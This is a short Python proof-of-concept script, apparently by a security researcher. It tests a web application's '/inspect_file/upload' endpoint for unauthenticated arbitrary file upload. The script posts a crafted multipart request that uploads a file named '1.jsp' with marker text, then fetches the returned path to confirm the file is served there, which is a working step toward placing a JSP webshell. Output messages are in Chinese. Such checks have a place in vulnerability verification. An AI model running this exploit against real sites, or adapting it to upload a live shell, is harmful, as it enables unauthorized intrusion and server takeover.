
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re
import time
import webbrowser

urllib3.disable_warnings()


def verify(site):
    burp0_url = site + "/inspect_file/upload"
    burp0_headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=---------------------------7db372eb000e2", "Connection": "close"} 
    burp0_data = "-----------------------------7db372eb000e2\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"1.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\nvulntest\r\n\r\n-----------------------------7db372eb000e2--"
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    r1data = r.json()
    if r.status_code == 200 and r1data["result"] == 0:
        shellpath = site + r1data["data"]["filePath"]
        r2 = requests.get(shellpath, verify=False)
        if r2.status_code == 200 and "vulntest" in r2.text:
            return shellpath
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，文件上传后的路径为：", info)
    else:
        print("[-]漏洞不存在")
